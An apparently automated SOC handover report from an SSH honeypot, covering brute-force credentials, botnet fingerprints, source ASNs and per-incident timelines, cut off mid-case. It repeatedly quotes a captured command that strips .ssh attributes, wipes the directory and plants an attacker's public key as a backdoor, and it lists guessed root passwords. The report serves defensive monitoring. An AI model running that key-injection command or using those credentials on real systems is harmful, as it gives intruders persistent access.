# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-22 |
| **Generated At** | 2026-05-22T17:56:40Z |
| **Shift Time** | 17:56 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **317** |
| Confirmed Threats | **198** |
| False Positives Filtered | **119** (37.5%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **17** |
| High Severity Cases | **79** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **238** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **168** |
| Unique Credential Pairs | **83** |
| Unique Usernames | **39** |
| Unique Passwords | **73** |
| Successful Auth Pairs | **50** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 81 |
| `345gs5662d34` | 39 |
| `ubuntu` | 3 |
| `user2` | 2 |
| `web` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 39 |
| `3245gs5662d34` | 39 |
| `` | 7 |
| `1234` | 4 |
| `root` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 39 |
| `root` | `3245gs5662d34` | 39 |
| `GET / HTTP/1.0` | `` | 2 |
| `OPTIONS / HTTP/1.0` | `` | 2 |
| `root` | `A.123456` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Password2024` | `186.103.169.12` | 2026-05-22T14:52:51 |
| `root` | `3245gs5662d34` | `186.103.169.12` | 2026-05-22T14:52:59 |
| `root` | `qwer1234QWER` | `101.36.106.162` | 2026-05-22T15:00:13 |
| `root` | `3245gs5662d34` | `101.36.106.162` | 2026-05-22T15:00:16 |
| `root` | `aa@159357` | `101.36.106.162` | 2026-05-22T15:04:09 |
| `root` | `123456@` | `186.103.169.12` | 2026-05-22T15:10:31 |
| `root` | `Qq123456!@#` | `101.36.106.162` | 2026-05-22T15:12:00 |
| `root` | `Asd123` | `102.88.137.145` | 2026-05-22T15:14:56 |
| `root` | `3245gs5662d34` | `102.88.137.145` | 2026-05-22T15:15:03 |
| `root` | `rio` | `186.103.169.12` | 2026-05-22T15:19:12 |
| `root` | `2wsx!QAZ` | `186.96.151.198` | 2026-05-22T15:23:40 |
| `root` | `Pass123456@` | `186.103.169.12` | 2026-05-22T15:23:43 |
| `root` | `3245gs5662d34` | `186.96.151.198` | 2026-05-22T15:23:46 |
| `root` | `qwe@12345` | `103.26.136.173` | 2026-05-22T15:26:32 |
| `root` | `3245gs5662d34` | `103.26.136.173` | 2026-05-22T15:26:34 |
| `root` | `aaaa` | `81.9.145.130` | 2026-05-22T15:30:32 |
| `root` | `professor` | `186.96.151.198` | 2026-05-22T15:30:36 |
| `root` | `3245gs5662d34` | `81.9.145.130` | 2026-05-22T15:30:37 |
| `root` | `Test@2026` | `186.103.169.12` | 2026-05-22T15:32:39 |
| `root` | `Qwer@1234` | `186.96.151.198` | 2026-05-22T15:41:03 |
| `root` | `Root-123` | `81.9.145.130` | 2026-05-22T15:41:03 |
| `root` | `root@12345` | `81.9.145.130` | 2026-05-22T15:46:19 |
| `root` | `@Ww123456` | `186.96.151.198` | 2026-05-22T15:51:20 |
| `root` | `Rr111111` | `186.96.151.198` | 2026-05-22T15:54:56 |
| `root` | `Xx123456` | `81.9.145.130` | 2026-05-22T15:56:52 |
| `root` | `Password@1234!` | `186.96.151.198` | 2026-05-22T15:58:31 |
| `root` | `Zb123456` | `81.9.145.130` | 2026-05-22T16:07:28 |
| `root` | `admin1` | `81.9.145.130` | 2026-05-22T16:23:14 |
| `root` | `abc123ABC` | `81.9.145.130` | 2026-05-22T16:28:30 |
| `root` | `passw0rd` | `81.9.145.130` | 2026-05-22T16:33:48 |
| `root` | `A.123456` | `186.146.235.58` | 2026-05-22T17:10:11 |
| `root` | `3245gs5662d34` | `186.146.235.58` | 2026-05-22T17:10:18 |
| `root` | `Bismillah` | `102.88.137.80` | 2026-05-22T17:17:45 |
| `root` | `3245gs5662d34` | `102.88.137.80` | 2026-05-22T17:17:52 |
| `root` | `1qaSW@3ed` | `102.88.137.80` | 2026-05-22T17:19:32 |
| `root` | `1qazXSW@#EDC` | `102.88.137.80` | 2026-05-22T17:21:23 |
| `root` | `Lenovo@123` | `102.88.137.80` | 2026-05-22T17:26:47 |
| `root` | `abcd12345678` | `102.88.137.80` | 2026-05-22T17:27:14 |
| `root` | `Yl123456` | `102.88.137.80` | 2026-05-22T17:28:43 |
| `root` | `123456aaA` | `102.88.137.80` | 2026-05-22T17:30:36 |
| `root` | `` | `101.126.147.62` | 2026-05-22T17:30:54 |
| `root` | `A.123456` | `102.88.137.80` | 2026-05-22T17:32:20 |
| `root` | `z` | `85.184.248.187` | 2026-05-22T17:32:53 |
| `root` | `3245gs5662d34` | `85.184.248.187` | 2026-05-22T17:32:57 |
| `root` | `minecraft` | `43.108.17.138` | 2026-05-22T17:33:08 |
| `root` | `3245gs5662d34` | `43.108.17.138` | 2026-05-22T17:33:11 |
| `root` | `vpn123` | `102.88.137.80` | 2026-05-22T17:34:09 |
| `root` | `1qaz2wsx#$` | `102.88.137.80` | 2026-05-22T17:35:59 |
| `root` | `111111` | `102.88.137.80` | 2026-05-22T17:37:50 |
| `root` | `Woaini123` | `102.88.137.80` | 2026-05-22T17:39:37 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **317** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 155 |
| OpenSSH | 15 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 78 | 8 |
| `713bd9cc9355...` | Mirai/variant | 40 | 1 |
| `03a80b21afa8...` | Modern SSH client | 33 | 3 |
| `c118de82e19e...` | Mirai/variant | 15 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 78 | 8 | Mirai/variant |
| `713bd9cc9355...` | libssh | 40 | 1 | Mirai/variant |
| `03a80b21afa8...` | libssh | 33 | 3 | Modern SSH client |
| `c118de82e19e...` | OpenSSH | 15 | 1 | Mirai/variant |
| `95420f9d932d...` | libssh | 4 | 3 | — |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 39 | 10 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.146.235.58`, `85.184.248.187`, `186.96.151.198`, `102.88.137.145`, `43.108.17.138`, `103.26.136.173`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **27** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS398324` | Censys, Inc. | 6 | HIGH |
| `AS264778` | TotalCom Venezuela C.A. | 3 | MEDIUM |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS29465` | MTN NIGERIA Communication limited | 2 | HIGH |
| `AS31898` | Oracle Corporation | 1 | HIGH |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 1 | HIGH |
| `AS8151` | UNINET | 1 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (79)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-82093845a50d

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 14:52 |
| **Last Seen** | 2026-05-22 14:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:52:50` | `cowrie.session.connect` |
| `2026-05-22 14:52:50` | `cowrie.client.version` |
| `2026-05-22 14:52:50` | `cowrie.client.kex` |
| `2026-05-22 14:52:51` | `cowrie.login.success` |
| `2026-05-22 14:52:52` | `cowrie.session.params` |
| `2026-05-22 14:52:52` | `cowrie.command.input` |
| `2026-05-22 14:52:52` | `cowrie.command.failed` |
| `2026-05-22 14:52:53` | `cowrie.log.closed` |
| `2026-05-22 14:52:53` | `cowrie.session.params` |
| `2026-05-22 14:52:53` | `cowrie.command.input` |
| `2026-05-22 14:52:54` | `cowrie.session.file_download` |
| `2026-05-22 14:52:54` | `cowrie.log.closed` |
| `2026-05-22 14:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7595a69d42d7

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 14:52 |
| **Last Seen** | 2026-05-22 14:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 14:52:57` | `cowrie.session.connect` |
| `2026-05-22 14:52:57` | `cowrie.client.version` |
| `2026-05-22 14:52:58` | `cowrie.client.kex` |
| `2026-05-22 14:52:59` | `cowrie.login.success` |
| `2026-05-22 14:52:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f267976fa89

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:00 |
| **Last Seen** | 2026-05-22 15:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:00:12` | `cowrie.session.connect` |
| `2026-05-22 15:00:12` | `cowrie.client.version` |
| `2026-05-22 15:00:12` | `cowrie.client.kex` |
| `2026-05-22 15:00:13` | `cowrie.login.success` |
| `2026-05-22 15:00:13` | `cowrie.session.params` |
| `2026-05-22 15:00:13` | `cowrie.command.input` |
| `2026-05-22 15:00:13` | `cowrie.command.failed` |
| `2026-05-22 15:00:13` | `cowrie.log.closed` |
| `2026-05-22 15:00:13` | `cowrie.session.params` |
| `2026-05-22 15:00:13` | `cowrie.command.input` |
| `2026-05-22 15:00:14` | `cowrie.session.file_download` |
| `2026-05-22 15:00:14` | `cowrie.log.closed` |
| `2026-05-22 15:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-795c8aad076c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:00 |
| **Last Seen** | 2026-05-22 15:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:00:15` | `cowrie.session.connect` |
| `2026-05-22 15:00:15` | `cowrie.client.version` |
| `2026-05-22 15:00:15` | `cowrie.client.kex` |
| `2026-05-22 15:00:16` | `cowrie.login.success` |
| `2026-05-22 15:00:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b9d7daa3031

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:04 |
| **Last Seen** | 2026-05-22 15:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:04:09` | `cowrie.session.connect` |
| `2026-05-22 15:04:09` | `cowrie.client.version` |
| `2026-05-22 15:04:09` | `cowrie.client.kex` |
| `2026-05-22 15:04:09` | `cowrie.login.success` |
| `2026-05-22 15:04:10` | `cowrie.session.params` |
| `2026-05-22 15:04:10` | `cowrie.command.input` |
| `2026-05-22 15:04:10` | `cowrie.command.failed` |
| `2026-05-22 15:04:10` | `cowrie.log.closed` |
| `2026-05-22 15:04:10` | `cowrie.session.params` |
| `2026-05-22 15:04:10` | `cowrie.command.input` |
| `2026-05-22 15:04:10` | `cowrie.session.file_download` |
| `2026-05-22 15:04:10` | `cowrie.log.closed` |
| `2026-05-22 15:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16006461aa39

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:04 |
| **Last Seen** | 2026-05-22 15:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:04:12` | `cowrie.session.connect` |
| `2026-05-22 15:04:12` | `cowrie.client.version` |
| `2026-05-22 15:04:12` | `cowrie.client.kex` |
| `2026-05-22 15:04:12` | `cowrie.login.success` |
| `2026-05-22 15:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fc1309e221f

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:10 |
| **Last Seen** | 2026-05-22 15:10 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:10:29` | `cowrie.session.connect` |
| `2026-05-22 15:10:29` | `cowrie.client.version` |
| `2026-05-22 15:10:29` | `cowrie.client.kex` |
| `2026-05-22 15:10:31` | `cowrie.login.success` |
| `2026-05-22 15:10:32` | `cowrie.session.params` |
| `2026-05-22 15:10:32` | `cowrie.command.input` |
| `2026-05-22 15:10:32` | `cowrie.command.failed` |
| `2026-05-22 15:10:32` | `cowrie.log.closed` |
| `2026-05-22 15:10:33` | `cowrie.session.params` |
| `2026-05-22 15:10:33` | `cowrie.command.input` |
| `2026-05-22 15:10:33` | `cowrie.session.file_download` |
| `2026-05-22 15:10:33` | `cowrie.log.closed` |
| `2026-05-22 15:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6b0d8ac8a5e

| Field | Detail |
|---|---|
| **Source IP** | `186.103.169[.]12` |
| **First Seen** | 2026-05-22 15:10 |
| **Last Seen** | 2026-05-22 15:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:10:37` | `cowrie.session.connect` |
| `2026-05-22 15:10:37` | `cowrie.client.version` |
| `2026-05-22 15:10:37` | `cowrie.client.kex` |
| `2026-05-22 15:10:39` | `cowrie.login.success` |
| `2026-05-22 15:10:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.103.169[.]12` to AbuseIPDB if not already reported
- [ ] Block `186.103.169[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9096eb16c26

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:11 |
| **Last Seen** | 2026-05-22 15:12 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:11:59` | `cowrie.session.connect` |
| `2026-05-22 15:11:59` | `cowrie.client.version` |
| `2026-05-22 15:11:59` | `cowrie.client.kex` |
| `2026-05-22 15:12:00` | `cowrie.login.success` |
| `2026-05-22 15:12:00` | `cowrie.session.params` |
| `2026-05-22 15:12:00` | `cowrie.command.input` |
| `2026-05-22 15:12:00` | `cowrie.command.failed` |
| `2026-05-22 15:12:00` | `cowrie.log.closed` |
| `2026-05-22 15:12:00` | `cowrie.session.params` |
| `2026-05-22 15:12:00` | `cowrie.command.input` |
| `2026-05-22 15:12:00` | `cowrie.session.file_download` |
| `2026-05-22 15:12:00` | `cowrie.log.closed` |
| `2026-05-22 15:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e24c56fc743

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]162` |
| **First Seen** | 2026-05-22 15:12 |
| **Last Seen** | 2026-05-22 15:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:12:02` | `cowrie.session.connect` |
| `2026-05-22 15:12:02` | `cowrie.client.version` |
| `2026-05-22 15:12:02` | `cowrie.client.kex` |
| `2026-05-22 15:12:03` | `cowrie.login.success` |
| `2026-05-22 15:12:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]162` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]162` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5901efebd50e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-22 15:14 |
| **Last Seen** | 2026-05-22 15:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 15:14:55` | `cowrie.session.connect` |
| `2026-05-22 15:14:55` | `cowrie.client.version` |
| `2026-05-22 15:14:55` | `cowrie.client.kex` |
| `2026-05-22 15:14:56` | `cowrie.login.success` |
| `2026-05-22 15:14:57` | `cowrie.session.params` |
| `2026-05-22 15:14:57` | `cowrie.command.input` |
| `2026-05-22 15:14:57` | `cowrie.command.failed` |
| `2026-05-22 15:14:57` | `cowrie.log.closed` |
| `2026-05-22 15:14:58` | `cowrie.session.params` |
| `2026-05-22 15:14:58` | `cowrie.command.input` |
| `2026-05-22 15:14:58` | `cowrie.session.file_download` |
| `2026-05-22 15:14:58` | `cowrie.log.closed` |
| `2026-05-22 15:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]145` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c30a8069f25

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]145` |
| **First Seen** | 2026-05-22 15:15 |
| **Last Seen** | 2026-05-22 15:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

